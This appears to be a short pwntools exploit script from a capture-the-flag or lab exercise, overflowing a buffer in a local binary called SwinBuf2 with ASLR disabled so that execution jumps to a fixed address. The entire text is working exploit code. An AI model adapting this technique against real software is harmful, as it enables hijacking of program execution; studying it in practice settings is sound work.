from pwn import *
context(arch = 'i386', os = 'linux')

# step 1: find offset
#buf = cyclic(50, n=4)

# step 2: use offset
buf = "a"*cyclic_find("aaia", n=4)
buf += p32(0x08048a74)

#step 3 : exploit
t = process("./SwinBuf2", aslr=False)

t.sendline(buf)
print t.recvall(1)
